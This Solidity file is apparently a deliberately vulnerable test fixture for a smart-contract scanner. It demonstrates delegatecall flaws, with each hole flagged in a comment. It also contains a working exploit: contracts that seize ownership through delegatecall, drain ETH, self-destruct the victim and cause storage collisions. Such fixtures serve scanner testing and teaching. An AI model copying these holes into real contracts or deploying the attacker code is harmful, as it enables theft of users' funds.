// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title DelegatecallVulnerable
 * @notice This contract demonstrates CRITICAL delegatecall vulnerabilities
 * @dev INTENTIONALLY VULNERABLE - For testing Web3CRIT Scanner
 */
contract DelegatecallVulnerable {
    address public owner;
    uint256 public value;
    mapping(address => bool) public authorized;

    constructor() {
        owner = msg.sender;
    }

    /**
     * @notice VULNERABILITY: User-controlled delegatecall target
     * @dev Anyone can specify the target contract address
     */
    function execute(address target, bytes memory data) public {
        // VULNERABILITY: User controls the target address
        target.delegatecall(data);
    }

    /**
     * @notice VULNERABILITY: User-controlled upgrade with delegatecall
     * @dev Allows arbitrary code execution in this contract's context
     */
    function upgrade(address newImplementation, bytes memory data) public {
        require(msg.sender == owner, "Only owner");

        // VULNERABILITY: Owner can point to malicious implementation
        newImplementation.delegatecall(data);
    }

    /**
     * @notice VULNERABILITY: Delegatecall to user-supplied library
     * @dev Even with access control, user controls the library address
     */
    function callLibrary(address lib, bytes memory data) public {
        require(authorized[msg.sender], "Not authorized");

        // VULNERABILITY: Authorized user controls library address
        (bool success, ) = lib.delegatecall(data);
        require(success, "Delegatecall failed");
    }

    /**
     * @notice VULNERABILITY: Proxy pattern with unprotected delegatecall
     * @dev Acts as proxy but allows any target
     */
    function proxy(address implementation, bytes calldata data) public payable returns (bytes memory) {
        // VULNERABILITY: No whitelist of valid implementations
        (bool success, bytes memory result) = implementation.delegatecall(data);
        require(success, "Proxy call failed");
        return result;
    }

    /**
     * @notice VULNERABILITY: Batch delegatecall
     * @dev Multiple user-controlled delegatecalls in one transaction
     */
    function batchExecute(address[] calldata targets, bytes[] calldata datas) public {
        require(msg.sender == owner, "Only owner");
        require(targets.length == datas.length, "Length mismatch");

        for (uint256 i = 0; i < targets.length; i++) {
            // VULNERABILITY: Multiple delegatecalls to user-controlled targets
            targets[i].delegatecall(datas[i]);
        }
    }

    /**
     * @notice VULNERABILITY: Delegatecall with msg.value forwarding
     * @dev Dangerous combination of delegatecall and value transfer
     */
    function executeWithValue(address target, bytes memory data) public payable {
        // VULNERABILITY: User controls target with delegatecall + value
        target.delegatecall(data);
    }

    function authorize(address user) public {
        require(msg.sender == owner, "Only owner");
        authorized[user] = true;
    }

    receive() external payable {}
}

/**
 * @title MaliciousImplementation
 * @notice Example malicious contract for delegatecall attack
 */
contract MaliciousImplementation {
    address public owner;  // Storage slot 0 - matches DelegatecallVulnerable
    uint256 public value;  // Storage slot 1 - matches DelegatecallVulnerable

    /**
     * @notice Malicious function that steals ownership
     * @dev When called via delegatecall, overwrites victim's owner
     */
    function pwn() public {
        owner = msg.sender;  // Overwrites slot 0 in victim contract
    }

    /**
     * @notice Drains all ETH from victim contract
     */
    function drain() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    /**
     * @notice Destroys the victim contract
     */
    function destroy() public {
        selfdestruct(payable(msg.sender));
    }
}

/**
 * @title StorageCollisionAttack
 * @notice Demonstrates storage collision vulnerability
 */
contract StorageCollisionAttack {
    // Different storage layout than victim
    uint256 public data;        // slot 0 - will overwrite owner in victim!
    address public controller;  // slot 1 - will overwrite value in victim!

    function maliciousFunction(uint256 newData) public {
        data = newData;  // Overwrites unexpected storage slot in victim
    }
}

/**
 * @title DelegatecallAttacker
 * @notice Orchestrates the delegatecall attack
 */
contract DelegatecallAttacker {
    DelegatecallVulnerable public victim;
    MaliciousImplementation public malicious;

    constructor(address _victim) {
        victim = DelegatecallVulnerable(payable(_victim));
        malicious = new MaliciousImplementation();
    }

    function attack() public {
        // Call victim's execute with our malicious contract
        bytes memory data = abi.encodeWithSignature("pwn()");
        victim.execute(address(malicious), data);

        // Now we're the owner, drain funds
        bytes memory drainData = abi.encodeWithSignature("drain()");
        victim.execute(address(malicious), drainData);
    }

    receive() external payable {}
}
